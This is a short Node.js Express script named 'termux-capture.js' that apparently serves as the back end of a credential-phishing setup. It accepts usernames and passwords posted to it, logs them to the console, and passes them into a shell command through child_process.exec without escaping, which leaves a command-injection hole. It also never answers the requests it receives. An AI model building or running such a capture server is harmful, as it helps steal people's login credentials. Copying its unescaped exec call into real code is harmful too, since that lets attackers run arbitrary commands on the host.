// termux-capture.js
const express = require('express');
const app = express();

app.use(express.json());

app.post('/', (req, res) => {
    const { username, password } = req.body;
    console.log(`Received credentials: ${username}, ${password}`);
    // Envia as credenciais para o Termux
    const termux = require('child_process');
    termux.exec(`echo "Username: ${username}, Password: ${password}"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
        console.log(`stderr: ${stderr}`);
    });
});

app.listen(3000, () => {
    console.log('Server listening on port 3000');
});
